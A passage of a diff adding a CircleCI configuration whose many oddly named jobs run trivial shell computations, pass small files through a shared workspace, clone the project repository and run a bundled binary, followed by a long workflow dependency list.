+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  do_assemble-quick-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: nocturne
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; printf "%d %d\n" 10 20 | awk '{print $1+$2, $1*$2}'; true ; } > /var/tmp/shard4/file4.out
+            echo "stage: assemble-quick-regression-suite, bytes: $(wc -c </var/tmp/shard4/file4.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - file4.out
+  assemble-quick-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/file4.out 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  reserve_Validate_Service1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: truce
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; yes "abcd" | head -200 | md5sum; true ; } > /var/tmp/shard4/delta-end.txt
+            echo "stage: Validate_Service1, bytes: $(wc -c </var/tmp/shard4/delta-end.txt)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - delta-end.txt
+  Validate_Service1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/handoff.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  loader_PROD_VERIFY_6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: assisted pullup
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{num=12345; r=""; while(num>0){r=(num%2) r; num=int(num/2)}; print r}'; true ; } > /var/tmp/shard4/r3.state
+            echo "stage: PROD_VERIFY_6, bytes: $(wc -c </var/tmp/shard4/r3.state)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - r3.state
+  PROD_VERIFY_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  Alpha_foxtrot-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: ping intern
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10;i++){s+=1/i} printf "%.4f\n",s}'; true ; } > /var/tmp/shard4/step-3.txt
+            echo "stage: foxtrot-5, bytes: $(wc -c </var/tmp/shard4/step-3.txt)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - step-3.txt
+  foxtrot-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/step-3.txt 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  prep_t-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: stuffed
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; cat /proc/version 2>/dev/null | head -c 80; true ; } > /var/tmp/shard4/work-03.data
+            echo "stage: t-x, bytes: $(wc -c </var/tmp/shard4/work-03.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - work-03.data
+  t-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+
+  bootstrap_india-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: siege
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=1000;i++)n^=i; print n}'; true ; } > /var/tmp/shard4/gamma-out.data
+            echo "stage: india-3, bytes: $(wc -c </var/tmp/shard4/gamma-out.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - gamma-out.data
+  fetch_run-nightly-docker-image_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: flaky still
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_bench && touch /tmp/_bench/mark && ls /tmp/_bench; true ; } > /var/tmp/shard4/03.log
+            echo "stage: run-nightly-docker-image, bytes: $(wc -c </var/tmp/shard4/03.log)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - 03.log
+  alpha_bake-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: blue block
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk '{s += int($1/10)}END{print s}'; true ; } > /var/tmp/shard4/checkpoint.pkl
+            echo "stage: bake-it, bytes: $(wc -c </var/tmp/shard4/checkpoint.pkl)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - checkpoint.pkl
+  cook_ruby3-fmt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: pause here
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /var/tmp/shard4/7921.out
+            echo "stage: ruby3-fmt, bytes: $(wc -c </var/tmp/shard4/7921.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - 7921.out
+  route_UAT_HOOK_7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: mostly green
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; date +%s%N; true ; } > /var/tmp/shard4/build-01.data
+            echo "stage: UAT_HOOK_7, bytes: $(wc -c </var/tmp/shard4/build-01.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - build-01.data
+  stage_auh-check-5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: oak split
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; seq 1 192314 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /var/tmp/shard4/artifact.bin
+            echo "stage: auh-check-5, bytes: $(wc -c </var/tmp/shard4/artifact.bin)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - artifact.bin
+  stepA_fix-dashboard-bug_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: flat check
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; head -c 1024 /dev/urandom | sha1sum | awk '{print $1}'; true ; } > /var/tmp/shard4/answer.log
+            echo "stage: fix-dashboard-bug, bytes: $(wc -c </var/tmp/shard4/answer.log)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - answer.log
+  beta_ga-v4_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: tuesday bite
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo 'hidden' | sed 's/./*/g'; true ; } > /var/tmp/shard4/z5
+            echo "stage: ga-v4, bytes: $(wc -c </var/tmp/shard4/z5)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - z5
+  rerun_add-router-v2-reload_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: tap tap
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; seq 2 100 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next} print}' | tail -5; true ; } > /var/tmp/shard4/step-11.out
+            echo "stage: add-router-v2-reload, bytes: $(wc -c </var/tmp/shard4/step-11.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - step-11.out
+workflows:
+  build:
+    jobs:
+      - auditor_india-3
+      - bootstrap_india-3_2:
+          requires:
+            - auditor_india-3
+      - india-3:
+          requires:
+            - bootstrap_india-3_2
+      - install_run-nightly-docker-image:
+          requires:
+            - bootstrap_india-3_2
+      - fetch_run-nightly-docker-image_2:
+          requires:
+            - install_run-nightly-docker-image
+      - run-nightly-docker-image:
+          requires:
+            - fetch_run-nightly-docker-image_2
+      - drain_bake-it:
+          requires:
+            - fetch_run-nightly-docker-image_2
+      - alpha_bake-it_2:
+          requires:
+            - drain_bake-it
+      - bake-it:
+          requires:
+            - alpha_bake-it_2
+      - ctx2_ruby3-fmt:
+          requires:
+            - alpha_bake-it_2
+      - cook_ruby3-fmt_2:
+          requires:
+            - ctx2_ruby3-fmt
+      - ruby3-fmt:
+          requires:
+            - cook_ruby3-fmt_2
+      - package_UAT_HOOK_7:
+          requires:
+            - cook_ruby3-fmt_2
+      - route_UAT_HOOK_7_2:
+          requires:
+            - package_UAT_HOOK_7
+      - UAT_HOOK_7:
+          requires:
+            - route_UAT_HOOK_7_2
+      - redo_auh-check-5:
+          requires:
+            - route_UAT_HOOK_7_2
+      - stage_auh-check-5_2:
+          requires:
+            - redo_auh-check-5
+      - auh-check-5:
+          requires:
+            - stage_auh-check-5_2
+      - Beta_romeo-3
+      - Alpha_RunRelease
+      - reserve_Validate_Service1
+      - romeo-3:
+          requires:
+            - Beta_romeo-3
+            - Alpha_RunRelease
+            - reserve_Validate_Service1
+      - RunRelease:
+          requires:
+            - Beta_romeo-3
+            - Alpha_RunRelease
+            - reserve_Validate_Service1
+      - Validate_Service1:
+          requires:
+            - Beta_romeo-3
+            - Alpha_RunRelease
+            - reserve_Validate_Service1
+      - v9-ga:
+          requires:
+            - Beta_romeo-3
+            - Alpha_RunRelease
+            - reserve_Validate_Service1
+      - Alpha_foxtrot-5
+      - foxtrot-5:
+          requires:
+            - Alpha_foxtrot-5
+      - warmup_q1-release:
+          requires:
+            - Alpha_foxtrot-5
+      - q1-release:
+          requires:
+            - warmup_q1-release
+      - do_assemble-quick-regression-suite:
+          requires:
+            - warmup_q1-release
+      - assemble-quick-regression-suite:
+          requires:
+            - do_assemble-quick-regression-suite
+      - inspect_intergration:
+          requires:
+            - do_assemble-quick-regression-suite
+      - intergration:
+          requires:
+            - inspect_intergration
+      - warmer_perseus-beta:
+          requires:
+            - inspect_intergration
+      - perseus-beta:
+          requires:
+            - warmer_perseus-beta
+      - precheck_rollout:
+          requires:
+            - warmer_perseus-beta
+      - rollout:
+          requires:
+            - precheck_rollout
+      - B_go-live:
+          requires:
+            - precheck_rollout
+      - go-live:
+          requires:
+            - B_go-live
+      - D_DATA-682:
+          requires:
+            - B_go-live
+      - DATA-682:
+          requires:
+            - D_DATA-682
+      - tmp_refactor-8572
+      - beta_v5-preview4
+      - postbuild_verify-production-docker-image
+      - refactor-8572:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - v5-preview4:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - verify-production-docker-image:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - prometheus-alpha:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - Prepare_Image5:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - PROD_VERIFY_6:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - t-x:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - q3-canary:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - succes-only:
+          requires:
+            - tmp_refactor-8572
+            - beta_v5-preview4
+            - postbuild_verify-production-docker-image
+      - kick_fix-dashboard-bug
+      - stepA_fix-dashboard-bug_2:
+          requires:
+            - kick_fix-dashboard-bug
+      - fix-dashboard-bug:
+          requires:
+            - stepA_fix-dashboard-bug_2
+      - round1_ga-v4:
+          requires:
+            - stepA_fix-dashboard-bug_2
+      - beta_ga-v4_2:
+          requires:
+            - round1_ga-v4
+      - ga-v4:
+          requires:
+            - beta_ga-v4_2
+      - prefetch_add-router-v2-reload:
+          requires:
+            - beta_ga-v4_2
+      - rerun_add-router-v2-reload_2:
+          requires:
+            - prefetch_add-router-v2-reload
+      - add-router-v2-reload:
+          requires:
+            - rerun_add-router-v2-reload_2
